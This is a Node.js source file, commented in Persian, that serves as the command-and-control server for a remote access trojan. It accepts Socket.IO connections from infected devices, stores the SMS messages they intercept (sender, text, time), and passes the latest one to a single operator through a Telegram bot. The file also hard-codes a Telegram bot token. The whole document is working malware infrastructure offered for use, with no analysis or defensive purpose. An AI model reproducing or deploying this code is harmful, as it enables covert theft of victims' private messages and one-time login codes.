const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// توکن بات تلگرام
const TELEGRAM_TOKEN = '7883590739:AAEF6vbngZGD8bgMP2mOAmIXIzAgDK2ICe0';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

// ذخیره آخرین پیامک
let lastSms = null;

// آیدی چت مجاز (برای امنیت)
const ALLOWED_CHAT_ID = '7208236708';

// مدیریت اتصال RAT
io.on('connection', (socket) => {
    console.log('RAT connected:', socket.id);

    // دریافت پیامک جدید
    socket.on('new_sms', (data) => {
        lastSms = data;
        console.log('New SMS:', data);
    });

    socket.on('disconnect', () => {
        console.log('RAT disconnected:', socket.id);
    });
});

// دستورات بات تلگرام
bot.onText(/\/last_sms/, (msg) => {
    const chatId = msg.chat.id;

    // بررسی دسترسی
    if (chatId.toString() !== ALLOWED_CHAT_ID) {
        bot.sendMessage(chatId, 'Access denied!');
        return;
    }

    if (lastSms) {
        const message = `
📩 *Last SMS*
👤 *Sender*: ${lastSms.sender}
💬 *Message*: ${lastSms.body}
⏰ *Time*: ${new Date(lastSms.timestamp).toLocaleString()}
        `;
        bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
    } else {
        bot.sendMessage(chatId, 'No SMS received yet.');
    }
});

// شروع سرور
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
